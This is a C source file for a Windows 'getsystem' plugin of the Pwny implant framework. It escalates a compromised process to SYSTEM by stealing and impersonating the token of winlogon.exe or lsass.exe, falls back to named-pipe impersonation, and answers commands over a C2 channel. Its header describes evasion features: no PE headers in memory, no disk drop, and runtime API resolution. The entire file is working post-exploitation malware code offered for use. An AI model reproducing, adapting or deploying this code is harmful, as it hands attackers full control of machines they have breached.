/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Getsystem COT plugin — privilege escalation to SYSTEM.
 *
 * Built as a COT (Code-Only Tab) blob: no PE headers in memory,
 * no disk drop, all executable pages backed by a signed system DLL.
 * All Pwny API calls go through the vtable; all Win32 APIs are
 * resolved at runtime via cot_resolve().
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>
#include <tlhelp32.h>

/* tab_cot.h MUST come after the real Pwny headers: its macros
 * redefine api_call_register, tlv_pkt_get_*, etc. and would break
 * the function declarations in api.h / tlv.h if included first. */
#define COT_PLUGIN
#include <pwny/tab_cot.h>


#define GETSYSTEM_ELEVATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define TLV_TYPE_GETSYS_TECHNIQUE TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)

#define GETSYS_TECHNIQUE_TOKEN  0
#define GETSYS_TECHNIQUE_PIPE   1

/* ------------------------------------------------------------------ */
/* Win32 function pointer types — resolved at init via cot_resolve()   */
/* ------------------------------------------------------------------ */

typedef BOOL    (WINAPI *fn_OpenThreadToken)(HANDLE, DWORD, BOOL, PHANDLE);
typedef HANDLE  (WINAPI *fn_GetCurrentThread)(void);
typedef BOOL    (WINAPI *fn_GetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL    (WINAPI *fn_AllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID *);
typedef BOOL    (WINAPI *fn_EqualSid)(PSID, PSID);
typedef PVOID   (WINAPI *fn_FreeSid)(PSID);
typedef BOOL    (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef HANDLE  (WINAPI *fn_GetCurrentProcess)(void);
typedef BOOL    (WINAPI *fn_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL    (WINAPI *fn_AdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
typedef DWORD   (WINAPI *fn_GetLastError)(void);
typedef HANDLE  (WINAPI *fn_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL    (WINAPI *fn_Process32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL    (WINAPI *fn_Process32Next)(HANDLE, LPPROCESSENTRY32);
typedef HANDLE  (WINAPI *fn_OpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL    (WINAPI *fn_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL    (WINAPI *fn_ImpersonateLoggedOnUser)(HANDLE);
typedef BOOL    (WINAPI *fn_RevertToSelf)(void);
typedef HANDLE  (WINAPI *fn_CreateNamedPipeA)(LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
typedef HANDLE  (WINAPI *fn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *fn_ConnectNamedPipe)(HANDLE, LPOVERLAPPED);
typedef BOOL    (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI *fn_ImpersonateNamedPipeClient)(HANDLE);
typedef BOOL    (WINAPI *fn_DisconnectNamedPipe)(HANDLE);
typedef DWORD   (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef HANDLE  (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef void    (WINAPI *fn_Sleep)(DWORD);
typedef DWORD   (WINAPI *fn_GetCurrentProcessId)(void);
typedef int     (__cdecl *fn__snprintf)(char *, size_t, const char *, ...);

static struct
{
    fn_OpenThreadToken           pOpenThreadToken;
    fn_GetCurrentThread          pGetCurrentThread;
    fn_GetTokenInformation       pGetTokenInformation;
    fn_CloseHandle               pCloseHandle;
    fn_AllocateAndInitializeSid  pAllocateAndInitializeSid;
    fn_EqualSid                  pEqualSid;
    fn_FreeSid                   pFreeSid;
    fn_OpenProcessToken          pOpenProcessToken;
    fn_GetCurrentProcess         pGetCurrentProcess;
    fn_LookupPrivilegeValueA     pLookupPrivilegeValueA;
    fn_AdjustTokenPrivileges     pAdjustTokenPrivileges;
    fn_GetLastError              pGetLastError;
    fn_CreateToolhelp32Snapshot  pCreateToolhelp32Snapshot;
    fn_Process32First            pProcess32First;
    fn_Process32Next             pProcess32Next;
    fn_OpenProcess               pOpenProcess;
    fn_DuplicateTokenEx          pDuplicateTokenEx;
    fn_ImpersonateLoggedOnUser   pImpersonateLoggedOnUser;
    fn_RevertToSelf              pRevertToSelf;
    fn_CreateNamedPipeA          pCreateNamedPipeA;
    fn_CreateThread              pCreateThread;
    fn_ConnectNamedPipe          pConnectNamedPipe;
    fn_ReadFile                  pReadFile;
    fn_ImpersonateNamedPipeClient pImpersonateNamedPipeClient;
    fn_DisconnectNamedPipe       pDisconnectNamedPipe;
    fn_WaitForSingleObject       pWaitForSingleObject;
    fn_CreateFileA               pCreateFileA;
    fn_WriteFile                 pWriteFile;
    fn_Sleep                     pSleep;
    fn_GetCurrentProcessId       pGetCurrentProcessId;
    fn__snprintf                 p_snprintf;
} w;

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static int getsystem_is_system(void)
{
    HANDLE hToken;
    BYTE tokenInfo[4096];
    DWORD dwSize;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID systemSid = NULL;
    BOOL isSystem;

    if (!w.pOpenThreadToken(w.pGetCurrentThread(), TOKEN_QUERY, FALSE, &hToken))
    {
        return 0;
    }

    if (!w.pGetTokenInformation(hToken, TokenUser, tokenInfo,
                                sizeof(tokenInfo), &dwSize))
    {
        w.pCloseHandle(hToken);
        return 0;
    }

    w.pCloseHandle(hToken);

    if (!w.pAllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                     0, 0, 0, 0, 0, 0, 0, &systemSid))
    {
        return 0;
    }

    isSystem = w.pEqualSid(((TOKEN_USER *)tokenInfo)->User.Sid, systemSid);
    w.pFreeSid(systemSid);

    return isSystem ? 1 : 0;
}

static int getsystem_enable_privilege(LPCSTR priv)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!w.pOpenProcessToken(w.pGetCurrentProcess(),
                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return -1;
    }

    if (!w.pLookupPrivilegeValueA(NULL, priv, &luid))
    {
        w.pCloseHandle(hToken);
        return -1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    w.pAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    w.pCloseHandle(hToken);

    return (w.pGetLastError() == ERROR_NOT_ALL_ASSIGNED) ? -1 : 0;
}

static DWORD getsystem_find_system_pid(void)
{
    HANDLE hSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnap = w.pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (w.pProcess32First(hSnap, &pe32))
    {
        do
        {
            if (_stricmp(pe32.szExeFile, "winlogon.exe") == 0)
            {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (w.pProcess32Next(hSnap, &pe32));
    }

    if (pid == 0)
    {
        w.pProcess32First(hSnap, &pe32);
        do
        {
            if (_stricmp(pe32.szExeFile, "lsass.exe") == 0)
            {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (w.pProcess32Next(hSnap, &pe32));
    }

    w.pCloseHandle(hSnap);
    return pid;
}

static int getsystem_via_token(void)
{
    DWORD sys_pid;
    HANDLE hProcess;
    HANDLE hToken;
    HANDLE hDupToken;

    getsystem_enable_privilege("SeDebugPrivilege");

    sys_pid = getsystem_find_system_pid();
    if (sys_pid == 0)
    {
        log_debug("* Could not find SYSTEM process\n");
        return -1;
    }

    log_debug("* Found SYSTEM process PID: %lu\n", sys_pid);

    hProcess = w.pOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sys_pid);
    if (hProcess == NULL)
    {
        log_debug("* OpenProcess failed (%lu)\n", w.pGetLastError());
        return -1;
    }

    if (!w.pOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))
    {
        log_debug("* OpenProcessToken failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hProcess);
        return -1;
    }

    w.pCloseHandle(hProcess);

    if (!w.pDuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                             SecurityImpersonation, TokenImpersonation,
                             &hDupToken))
    {
        log_debug("* DuplicateTokenEx failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hToken);
        return -1;
    }

    w.pCloseHandle(hToken);

    if (!w.pImpersonateLoggedOnUser(hDupToken))
    {
        log_debug("* ImpersonateLoggedOnUser failed (%lu)\n", w.pGetLastError());
        w.pCloseHandle(hDupToken);
        return -1;
    }

    w.pCloseHandle(hDupToken);

    if (!getsystem_is_system())
    {
        log_debug("* Token impersonation did not yield SYSTEM\n");
        w.pRevertToSelf();
        return -1;
    }

    log_debug("* Successfully impersonated SYSTEM\n");
    return 0;
}

static DWORD WINAPI getsystem_pipe_client_thread(LPVOID param)
{
    char *pipe_name = (char *)param;
    HANDLE hFile;
    DWORD written;
    char buf[] = "getsystem";

    w.pSleep(500);

    hFile = w.pCreateFileA(pipe_name, GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        w.pWriteFile(hFile, buf, sizeof(buf), &written, NULL);
        w.pCloseHandle(hFile);
    }

    return 0;
}

static int getsystem_via_pipe(void)
{
    HANDLE hPipe;
    HANDLE hThread;
    HANDLE hToken;
    char pipe_name[256];
    DWORD tid;
    BOOL connected;
    char buf[64];
    DWORD bytes_read;

    getsystem_enable_privilege("SeImpersonatePrivilege");

    w.p_snprintf(pipe_name, sizeof(pipe_name),
                 "\\\\.\\pipe\\pwny_%lu", w.pGetCurrentProcessId());

    hPipe = w.pCreateNamedPipeA(
        pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        log_debug("* CreateNamedPipe failed (%lu)\n", w.pGetLastError());
        return -1;
    }

    hThread = w.pCreateThread(NULL, 0, getsystem_pipe_client_thread,
                              pipe_name, 0, &tid);
    if (hThread == NULL)
    {
        w.pCloseHandle(hPipe);
        return -1;
    }

    connected = w.pConnectNamedPipe(hPipe, NULL) ?
                TRUE : (w.pGetLastError() == ERROR_PIPE_CONNECTED);

    if (!connected)
    {
        w.pWaitForSingleObject(hThread, 5000);
        w.pCloseHandle(hThread);
        w.pCloseHandle(hPipe);
        return -1;
    }

    w.pReadFile(hPipe, buf, sizeof(buf), &bytes_read, NULL);

    if (!w.pImpersonateNamedPipeClient(hPipe))
    {
        log_debug("* ImpersonateNamedPipeClient failed (%lu)\n", w.pGetLastError());
        w.pDisconnectNamedPipe(hPipe);
        w.pCloseHandle(hPipe);
        w.pWaitForSingleObject(hThread, 5000);
        w.pCloseHandle(hThread);
        return -1;
    }

    w.pDisconnectNamedPipe(hPipe);
    w.pCloseHandle(hPipe);
    w.pWaitForSingleObject(hThread, 5000);
    w.pCloseHandle(hThread);

    if (!getsystem_is_system())
    {
        log_debug("* Pipe impersonation did not yield SYSTEM\n");
        w.pRevertToSelf();
        return -1;
    }

    log_debug("* Named pipe impersonation successful\n");
    return 0;
}

static tlv_pkt_t *getsystem_elevate(c2_t *c2)
{
    int technique;
    int result;

    technique = GETSYS_TECHNIQUE_TOKEN;
    tlv_pkt_get_u32(c2->request, TLV_TYPE_GETSYS_TECHNIQUE, &technique);

    switch (technique)
    {
        case GETSYS_TECHNIQUE_TOKEN:
            result = getsystem_via_token();
            break;
        case GETSYS_TECHNIQUE_PIPE:
            result = getsystem_via_pipe();
            break;
        default:
            result = -1;
            break;
    }

    if (result != 0)
    {
        if (technique == GETSYS_TECHNIQUE_TOKEN)
        {
            result = getsystem_via_pipe();
        }
        else
        {
            result = getsystem_via_token();
        }
    }

    if (result == 0)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* Resolve kernel32.dll functions */
    w.pGetCurrentThread         = (fn_GetCurrentThread)cot_resolve("kernel32.dll",
                                                                    "GetCurrentThread");
    w.pCloseHandle              = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                               "CloseHandle");
    w.pGetCurrentProcess        = (fn_GetCurrentProcess)cot_resolve("kernel32.dll",
                                                                     "GetCurrentProcess");
    w.pGetLastError             = (fn_GetLastError)cot_resolve("kernel32.dll",
                                                                "GetLastError");
    w.pCreateToolhelp32Snapshot = (fn_CreateToolhelp32Snapshot)cot_resolve("kernel32.dll",
                                                                           "CreateToolhelp32Snapshot");
    w.pProcess32First           = (fn_Process32First)cot_resolve("kernel32.dll",
                                                                  "Process32First");
    w.pProcess32Next            = (fn_Process32Next)cot_resolve("kernel32.dll",
                                                                 "Process32Next");
    w.pOpenProcess              = (fn_OpenProcess)cot_resolve("kernel32.dll",
                                                               "OpenProcess");
    w.pCreateNamedPipeA         = (fn_CreateNamedPipeA)cot_resolve("kernel32.dll",
                                                                    "CreateNamedPipeA");
    w.pCreateThread             = (fn_CreateThread)cot_resolve("kernel32.dll",
                                                                "CreateThread");
    w.pConnectNamedPipe         = (fn_ConnectNamedPipe)cot_resolve("kernel32.dll",
                                                                    "ConnectNamedPipe");
    w.pReadFile                 = (fn_ReadFile)cot_resolve("kernel32.dll",
                                                            "ReadFile");
    w.pDisconnectNamedPipe      = (fn_DisconnectNamedPipe)cot_resolve("kernel32.dll",
                                                                       "DisconnectNamedPipe");
    w.pWaitForSingleObject      = (fn_WaitForSingleObject)cot_resolve("kernel32.dll",
                                                                       "WaitForSingleObject");
    w.pCreateFileA              = (fn_CreateFileA)cot_resolve("kernel32.dll",
                                                               "CreateFileA");
    w.pWriteFile                = (fn_WriteFile)cot_resolve("kernel32.dll",
                                                             "WriteFile");
    w.pSleep                    = (fn_Sleep)cot_resolve("kernel32.dll",
                                                         "Sleep");
    w.pGetCurrentProcessId      = (fn_GetCurrentProcessId)cot_resolve("kernel32.dll",
                                                                       "GetCurrentProcessId");

    /* Resolve advapi32.dll functions */
    w.pOpenThreadToken          = (fn_OpenThreadToken)cot_resolve("advapi32.dll",
                                                                   "OpenThreadToken");
    w.pGetTokenInformation      = (fn_GetTokenInformation)cot_resolve("advapi32.dll",
                                                                       "GetTokenInformation");
    w.pAllocateAndInitializeSid = (fn_AllocateAndInitializeSid)cot_resolve("advapi32.dll",
                                                                            "AllocateAndInitializeSid");
    w.pEqualSid                 = (fn_EqualSid)cot_resolve("advapi32.dll",
                                                             "EqualSid");
    w.pFreeSid                  = (fn_FreeSid)cot_resolve("advapi32.dll",
                                                           "FreeSid");
    w.pOpenProcessToken         = (fn_OpenProcessToken)cot_resolve("advapi32.dll",
                                                                    "OpenProcessToken");
    w.pLookupPrivilegeValueA    = (fn_LookupPrivilegeValueA)cot_resolve("advapi32.dll",
                                                                         "LookupPrivilegeValueA");
    w.pAdjustTokenPrivileges    = (fn_AdjustTokenPrivileges)cot_resolve("advapi32.dll",
                                                                         "AdjustTokenPrivileges");
    w.pDuplicateTokenEx         = (fn_DuplicateTokenEx)cot_resolve("advapi32.dll",
                                                                    "DuplicateTokenEx");
    w.pImpersonateLoggedOnUser  = (fn_ImpersonateLoggedOnUser)cot_resolve("advapi32.dll",
                                                                           "ImpersonateLoggedOnUser");
    w.pRevertToSelf             = (fn_RevertToSelf)cot_resolve("advapi32.dll",
                                                                "RevertToSelf");
    w.pImpersonateNamedPipeClient = (fn_ImpersonateNamedPipeClient)cot_resolve("advapi32.dll",
                                                                                "ImpersonateNamedPipeClient");

    /* Resolve msvcrt.dll functions */
    w.p_snprintf                = (fn__snprintf)cot_resolve("msvcrt.dll",
                                                             "_snprintf");

    /* Register handlers */
    api_call_register(api_calls, GETSYSTEM_ELEVATE, (api_t)getsystem_elevate);
}

#endif
